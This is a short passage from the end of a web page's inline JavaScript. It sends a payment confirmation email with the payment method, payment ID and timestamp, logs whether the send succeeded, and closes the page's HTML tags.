                payment_method: formData.paymentMethod,
                payment_id: formData.paymentId || 'N/A',
                timestamp: new Date().toLocaleString()
            });
            console.log('Payment confirmation email sent');
        } catch (error) {
            console.error('Failed to send payment confirmation:', error);
        }
    }
});
</script>
</body>
</html>